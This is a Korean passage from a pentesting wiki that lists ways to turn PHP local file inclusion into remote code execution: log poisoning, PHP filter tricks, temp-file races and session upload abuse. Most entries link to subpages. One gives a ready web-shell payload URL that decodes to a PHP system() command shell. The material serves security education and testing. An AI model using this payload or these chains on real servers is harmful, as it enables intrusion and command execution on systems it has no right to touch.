### **vsftpd** _로그_를 통해

FTP 서버 vsftpd의 로그는 _**/var/log/vsftpd.log**_에 위치합니다. 로컬 파일 포함 (LFI) 취약점이 존재하고 노출된 vsftpd 서버에 액세스가 가능한 시나리오에서 다음 단계를 고려할 수 있습니다:

1. 로그인 프로세스 중에 사용자 이름 필드에 PHP 페이로드를 삽입합니다.
2. 삽입 후, LFI를 사용하여 _**/var/log/vsftpd.log**_에서 서버 로그를 검색합니다.

### php base64 필터를 통해 (base64 사용)

[이](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) 기사에서 보여진대로, PHP base64 필터는 비베이스64를 무시합니다. 이를 사용하여 파일 확장자 확인을 우회할 수 있습니다: base64로 끝나는 ".php"를 제공하면, "."을 무시하고 "php"를 base64에 추가합니다. 다음은 예시 페이로드입니다:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### PHP 필터를 통해 (파일 필요 없음)

이 [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)은 **php 필터를 사용하여 임의의 콘텐츠를 생성**하여 출력할 수 있다고 설명합니다. 이는 기본적으로 **파일에 쓰지 않고도** include를 위한 **임의의 php 코드를 생성**할 수 있다는 것을 의미합니다.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### 세그멘테이션 폴트를 통해

`/tmp`에 **임시로 저장**될 파일을 **업로드**한 다음 **동일한 요청**에서 **세그멘테이션 폴트**를 트리거하면 **임시 파일이 삭제되지 않고** 해당 파일을 찾을 수 있습니다.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx 임시 파일 저장소를 통해

**로컬 파일 포함**을 발견했고 **Nginx**가 PHP 앞에서 실행 중이라면 다음 기술을 사용하여 RCE를 얻을 수 있을 수도 있습니다:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESS를 통해

**세션**이 없고 `session.auto_start`가 `Off`이어도 **로컬 파일 포함**을 발견했다면 **`PHP_SESSION_UPLOAD_PROGRESS`**를 **multipart POST** 데이터에 제공하면 PHP가 **세션을 활성화**합니다. 이를 악용하여 RCE를 얻을 수 있습니다:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windows에서의 임시 파일 업로드를 통해

**로컬 파일 포함**을 발견했고 서버가 **Windows**에서 실행 중이라면 RCE를 얻을 수 있을 수도 있습니다:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() (file\_uploads = on)를 통해

**로컬 파일 포함**을 발견했고 파일이 **phpinfo()를 노출**하며 file\_uploads = on인 경우 RCE를 얻을 수 있습니다:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + 경로 공개를 통해

**로컬 파일 포함**을 발견했고 **임시 파일의 경로를 유출**할 수 있지만 **서버**가 **포함할 파일에 PHP 표시가 있는지 확인**하는 경우, 이 **레이스 컨디션**을 사용하여 해당 확인을 우회할 수 있습니다:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### 영원한 대기 + 브루트포스를 통해

LFI를 악용하여 **임시 파일을 업로드**하고 서버가 **PHP 실행을 중단**시키면 **시간이 지나도록 파일 이름을 브루트 포스**하여 임시 파일을 찾을 수 있습니다:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### 치명적 오류로

`/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` 중 하나를 포함합니다. (동일한 것을 2번 포함해야 오류가 발생합니다).

**이것이 어떻게 유용한지는 모르겠지만 그럴 수도 있습니다.**\
_심지어 PHP 치명적 오류를 발생시켜도 PHP 임시 파일이 업로드된 파일은 삭제됩니다._
